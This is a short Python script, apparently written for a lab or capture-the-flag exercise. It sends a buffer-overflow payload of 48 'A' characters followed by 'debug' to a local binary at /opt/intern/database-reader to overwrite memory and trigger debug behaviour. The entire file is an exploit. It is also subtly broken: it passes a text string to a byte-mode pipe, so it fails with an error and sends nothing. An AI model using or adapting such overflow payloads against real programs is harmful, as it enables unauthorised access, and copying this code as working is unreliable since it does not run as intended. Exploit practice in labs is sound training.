#!/usr/bin/env python3

import subprocess

binary_path = '/opt/intern/database-reader'
payload = 48 * 'A' + 'debug'

def exploit_overwrite():
    try:
        process = subprocess.Popen(
            [binary_path],
            stdin = subprocess.PIPE,
            stdout = subprocess.PIPE,
            stderr = subprocess.PIPE,
            text = False
        )
        stdout, stderr = process.communicate(input=payload)
        print("Output of the program:")
        print(stdout.decode('latin-1'))

    except FileNotFoundError:
        print(f"Could not find {binary_path} binary file")
    except Exception as e:
        print(f"Error: {e}")



if __name__ == "__main__":
    exploit_overwrite()
